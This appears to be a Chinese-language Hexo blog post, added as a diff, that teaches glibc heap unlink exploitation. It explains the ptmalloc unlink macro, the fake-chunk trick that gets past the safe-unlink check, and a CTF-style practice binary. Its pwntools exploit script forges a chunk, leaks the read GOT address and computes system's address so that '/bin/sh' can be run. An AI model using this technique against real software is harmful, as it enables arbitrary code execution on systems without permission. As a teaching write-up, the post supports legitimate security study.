@@ -1,0 +1,271 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
+<meta name="author" content="treebacker">
+<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="../../../../images/favicon.png">
+
+
+<title>堆漏洞(一)之unlink利用 - Watch Security</title>
+
+<meta name="keywords" content="linux pwn unlink">
+
+<meta name="description " content="">
+
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="Tree">Tree</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
+        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
+        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Treebacker</h1>
+        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
+        <p class="cover-siteDesc">Tech and Eesay</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="active">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/essays" data-name="随笔">随笔</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">请输入关键字</label>
+        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
+        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '../../../../content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="" target="_blank">Treebacker</a>
+                    <span title="最后编辑于2019-04-18">2019-04-18</span>
+                </p>
+                <p></p>
+            </div>
+            <h2 class="post-title">堆漏洞(一)之unlink利用</h2>
+            <div class="post-meta">
+                本文总共8151个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*之前一直在学习Liunx下栈漏洞的利用，跟着一个教程作了一番系统的学习之后开始了堆heap的学习。最开始学习了一些基本的理论知识，例如在Glibc的内存管理方式，一块内存，从用户开始请求到将内存收回，中间经历过什么，有着什么样的原则？</span></span><br><span class="line"><span class="comment">先尝试着学习了glibc内存管理ptmalloc源码分析，中间跟着一些实践教程（例如CTF-wiki）做一些简单的原理性的测试加深了对内存管理过程的理解。起初的难真的超乎我的预料，堆漏洞基于的原理就是unlink。而对unlink的理解，我就花费了几乎半个月的时间，才能慢慢地理解、接受。</span></span><br><span class="line"><span class="comment">难没什么，咱有精力、时间、热情，就够了。</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h3 id="什么是unlink"><a href="#什么是unlink" class="headerlink" title="什么是unlink"></a>什么是unlink</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">	参考ptmalloc源码，就个人理解就是一种内存管理优化机制，在每一次<span class="built_in">free</span>的时候，都会检查该chunk的前后是否处于闲置（INUSE）状态，如果空闲，就会合并，减少内存的碎片。</span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line"> prevsize = p-&gt;prev_size;</span><br><span class="line"> size += prevsize;</span><br><span class="line"> p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line"> unlink(p, bck, fwd);</span><br><span class="line"> &#125;</span><br><span class="line">	如果当前 <span class="built_in">free</span> 的 chunk 的前一个相邻 chunk 为空闲状态，与前一个空闲 chunk 合并。计</span><br><span class="line">算合并后的 chunk 大小，并将前一个相邻空闲 chunk 从空闲 chunk 链表中删除。</span><br><span class="line"> <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line"> <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line"> nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">如果与当前 <span class="built_in">free</span> 的 chunk 相邻的下一个 chunk 不是分配区的 top chunk，查看与当前</span><br><span class="line">chunk 相邻的下一个 chunk 是否处于 inuse 状态。</span><br><span class="line"> <span class="comment">/* consolidate forward */</span></span><br><span class="line"> <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line"> unlink(nextchunk, bck, fwd);</span><br><span class="line"> size += nextsize;</span><br><span class="line"> &#125; <span class="keyword">else</span></span><br><span class="line"> clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">如果与当前 <span class="built_in">free</span> 的 chunk 相邻的下一个 chunk 处于 inuse 状态，清除当前 chunk 的 inuse</span><br><span class="line">状态，则当前 chunk 空闲了。否则，将相邻的下一个空闲 chunk 从空闲链表中删除，并计算</span><br><span class="line">当前 chunk 与下一个 chunk 合并后的 chunk 大小</span><br></pre></td></tr></table></figure>
+<h3 id="其中的可利用漏洞"><a href="#其中的可利用漏洞" class="headerlink" title="其中的可利用漏洞"></a>其中的可利用漏洞</h3><p>​    首先看一看堆分配的单元chunk的内存存储结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"> INTERNAL_SIZE_T prev_size; <span class="comment">/* Size of previous chunk (if free). */</span></span><br><span class="line"> INTERNAL_SIZE_T size; <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"> <span class="comment">/* Only used for large blocks: pointer to next larger size. */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">为了充分利用内存的目的，这里面的指针在空闲和INUSE时的作用会有差别。</span><br></pre></td></tr></table></figure>
+<p>这其中的漏洞原理就是在将P从双向链表删除的时候，对指针的操作造成的，我们可以构造fd, bk来达到修改原Chunk指针的目的。例如（以32bit为例)</p>
+<h4 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">对于unlink(P, BK, FD):</span><br><span class="line"><span class="number">1.</span> FD = P-&gt;fd		&lt;==&gt;  FD = P + <span class="number">0x8</span>		(addr - <span class="number">3</span>*<span class="number">0x4</span>)</span><br><span class="line"><span class="number">2.</span> BK = P-&gt;bk		&lt;==&gt;  BK = P + <span class="number">0xC</span>		(shellcode)</span><br><span class="line"><span class="number">3.</span> FD-&gt;bk = BK		&lt;==&gt;  FD + <span class="number">0xC</span> = BK		(addr = shellcode)	</span><br><span class="line"><span class="number">4.</span> BK-&gt;fd = FD		&lt;==&gt;  BK + <span class="number">0x8</span> = FD		(shellcode + <span class="number">0x08</span> = addr - <span class="number">0xC</span>)</span><br><span class="line">这里的指针都相当于内存里的一块地址，这里有四次内存写入操作。正常来说这里的值我们没办法控制，但其实严格来说，在内存里面并不存在真正的结构体结构成员。它们只是在内存管理上有某种联系。所以所谓的堆分配的单元Chunk，我们也可以自己构造。如果P-&gt;fd = addr - <span class="number">0xc</span>, P-&gt;bk = shellcode。</span><br><span class="line">上述过程就会引起任意代码执行。</span><br></pre></td></tr></table></figure>
+<h4 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h4><p>​    当然，现在的ptmalloc已经为堆释放、分配等过程做了很多的安全检测（具体地可以查看源代码），其中在unlink时，会进行下述检测</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;                                                          \</span><br><span class="line">    BK = P-&gt;bk;                                                          \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P); \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                                               \</span><br><span class="line">      FD-&gt;bk = BK;                                                       \</span><br><span class="line">      BK-&gt;fd = FD;                                                       \</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      \</span><br><span class="line">      &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;        \</span><br><span class="line">        assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);               \</span><br><span class="line">        assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);               \</span><br><span class="line">        <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                      \</span><br><span class="line">      <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      \</span><br><span class="line">        FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \</span><br><span class="line">      <span class="keyword">else</span> &#123;                                   \</span><br><span class="line">        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                \</span><br><span class="line">        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                \</span><br><span class="line">        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                \</span><br><span class="line">        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                \</span><br><span class="line">      &#125;                                \</span><br><span class="line">        &#125;   <span class="keyword">else</span> &#123;                                 \</span><br><span class="line">      P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;               \</span><br><span class="line">      P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;               \</span><br><span class="line">        &#125;                                      \</span><br><span class="line">      &#125;                                    \</span><br><span class="line">    &#125;                                                                    \</span><br></pre></td></tr></table></figure>
+<p>因为需要验证上述的利用过程就会失效，但是并不是没法利用了。</p>
+<h3 id="伪造的艺术"><a href="#伪造的艺术" class="headerlink" title="伪造的艺术"></a>伪造的艺术</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.	FD = P-&gt;fd      &lt;==&gt;  FD = &amp;P - 0xc</span><br><span class="line">2.	BK = P-&gt;bk		&lt;==&gt;  BK = &amp;P - 0x8</span><br><span class="line">此时检验 FD -&gt; bk == BK -&gt; fd == &amp;P  (通过检验)</span><br><span class="line">3.	FD -&gt; bk = BK			==&gt; P = &amp;P - 0x8</span><br><span class="line">4.	BK -&gt; fd = FD			==&gt; P = &amp;P - 0xc</span><br><span class="line"></span><br><span class="line">即上述的构造方式可以使得伪造的chunk的指针指向低0xc的位置。以后，再向伪造的chunk写入内容时，就相当于对它低0xc的位置写入内容。</span><br></pre></td></tr></table></figure>
+<h4 id="伪造chunk的一般形式"><a href="#伪造chunk的一般形式" class="headerlink" title="伪造chunk的一般形式"></a>伪造chunk的一般形式</h4><p>​                                <img src="F:\blog\source\_posts\堆漏洞-一-之unlink利用\fake-chunk.png" alt="">                            </p>
+<p>​                通过上述伪造，我们就能够将fake_chunk[0]的指针指向低0xc的位置，如下</p>
+<p>​                    <img src="F:\blog\source\_posts\堆漏洞-一-之unlink利用\chunk_use.png" alt=""></p>
+<h4 id="利用原理难点-为什么能够执行任意地址写操作"><a href="#利用原理难点-为什么能够执行任意地址写操作" class="headerlink" title="利用原理难点       为什么能够执行任意地址写操作"></a>利用原理难点       为什么能够执行任意地址写操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.	需要清楚的是，第一次分配内存中会出现堆块chunk[0]，而返回给我们的是指向fake_chunk的指针。我们只对fake_chunk有合法的操作，至于覆盖chunk[1]，是利用堆溢出。(连续两次分配，chunk[0]与chunk[1]的地址连续)</span><br><span class="line">2.	当fake_chunk指向低0xc的位置时， 我们继续向chunk[0]写入(即写入fake_chunk开始的位置)会写向fake_chunk-0xc。</span><br><span class="line">3.	当一个程序利用数组这类的连续存储的空间存储malloc返回的指针时，例如这里。chunk[0]和chunk[1]的返回指针就会存在数组的相邻元素中。global[0] = fake_chunk; global[1] = chunk2mem(chunk[1])</span><br><span class="line">4.	那么fake_chunk - 0xc实际就是global[-3]的位置， 如此向后写入，我们可以改造整个global，也即重写整个malloc返回的指针。</span><br><span class="line">5.	多次对同一个内存写入指针， 就会达到偷梁换柱的目的。（例如将free函数的got表换为system地址）</span><br></pre></td></tr></table></figure>
+<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>以unlink为例，提供了add、edit、delete、print四个功能，各部分主要代码如下</p>
+<h4 id="add-chunk"><a href="#add-chunk" class="headerlink" title="add_chunk"></a>add_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">Add_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( cnt &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Input the size of chunk you want to add:"</span>, <span class="number">0x28</span>u);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">    result = (<span class="keyword">void</span> *)size;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)size &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = cnt++;</span><br><span class="line">      result = <span class="built_in">malloc</span>(size);</span><br><span class="line">      *(&amp;Global + v1) = result;                 <span class="comment">// 全局变量数组存储指向我们请求的内存的指针</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<h4 id="edit-chunk"><a href="#edit-chunk" class="headerlink" title="edit_chunk"></a>edit_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">"Set chunk index:"</span>, <span class="number">0x10</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Set chunk data:"</span>, <span class="number">0xF</span>u);</span><br><span class="line">    result = read(<span class="number">0</span>, *(&amp;Global + v1), <span class="number">0x400</span>u);  <span class="comment">// 存在溢出</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<h4 id="delete-chunk"><a href="#delete-chunk" class="headerlink" title="delete_chunk"></a>delete_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">"Delete chunk index:"</span>, <span class="number">0x13</span>u);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v0);</span><br><span class="line"><span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> )</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;Global + v0));</span><br></pre></td></tr></table></figure>
+<h4 id="print-chunk"><a href="#print-chunk" class="headerlink" title="print_chunk"></a>print_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="string">"Print chunk index:"</span>, <span class="number">0x12</span>u);</span><br><span class="line"> __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line"> <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">   result = write(<span class="number">1</span>, *(&amp;Global + v1), <span class="number">0x100</span>u); <span class="comment">// 这里存在输出、可以用来泄露地址</span></span><br></pre></td></tr></table></figure>
+<p>利用思路基本就在上述的过程中.</p>
+<h5 id="模拟各个功能块"><a href="#模拟各个功能块" class="headerlink" title="模拟各个功能块"></a>模拟各个功能块</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addchunk</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'add:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setchunk</span><span class="params">(index, data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"set %d chunk already"</span> % index</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delchunk</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"delete %d chunk already"</span> % index</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printchunk</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Exit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"print %d chunk already"</span> % index</span><br></pre></td></tr></table></figure>
+<h5 id="伪造fake-chunk并unlink"><a href="#伪造fake-chunk并unlink" class="headerlink" title="伪造fake_chunk并unlink"></a>伪造fake_chunk并unlink</h5><p>这里addchunk块的大小会影响结果，最好动手调试。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#we cannot use fastbin which will not set p_inuse</span></span><br><span class="line">addchunk(<span class="number">0x100</span>)	<span class="comment">#idx 0</span></span><br><span class="line">addchunk(<span class="number">0x100</span>)	<span class="comment">#idx 1</span></span><br><span class="line">addchunk(<span class="number">0x100</span>)	<span class="comment">#idx 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setchunk(<span class="number">2</span>, <span class="string">'/bin/sh'</span>)		<span class="comment">#free(3) ==&gt; system('/bin/sh')</span></span><br><span class="line"></span><br><span class="line">chunk_head = <span class="number">0x08049D60</span></span><br><span class="line"><span class="comment">#fake_chunk</span></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0x100</span>) + p32(chunk_head<span class="number">-0xc</span>) + p32(chunk_head<span class="number">-0x8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += p32(<span class="number">0x100</span>) + p32(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x8049d60 ==&gt; 0x8049d54</span></span><br><span class="line"><span class="comment">#chun_head[0] ==&gt; chunk_head[0] - 0xc</span></span><br><span class="line">setchunk(<span class="number">0</span>,payload)</span><br><span class="line">delchunk(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h5 id="覆写泄露地址通过libc计算出system的地址"><a href="#覆写泄露地址通过libc计算出system的地址" class="headerlink" title="覆写泄露地址通过libc计算出system的地址"></a>覆写泄露地址通过libc计算出system的地址</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#write to chunk_head - 0xc</span></span><br><span class="line"><span class="comment">#chunk_head[1] ==&gt; read_got</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"***********leak the address of read**************"</span></span><br><span class="line">setchunk(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">12</span> + p32(chunk_head<span class="number">-0xc</span>) + p32(read_got))</span><br><span class="line">printchunk(<span class="number">1</span>)</span><br><span class="line">read_real = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"read_real ==&gt; "</span> + hex(read_real)</span><br><span class="line"></span><br><span class="line">offset = read_real - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">system_addr = offset + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr ==&gt; "</span> + hex(system_addr)</span><br></pre></td></tr></table></figure>
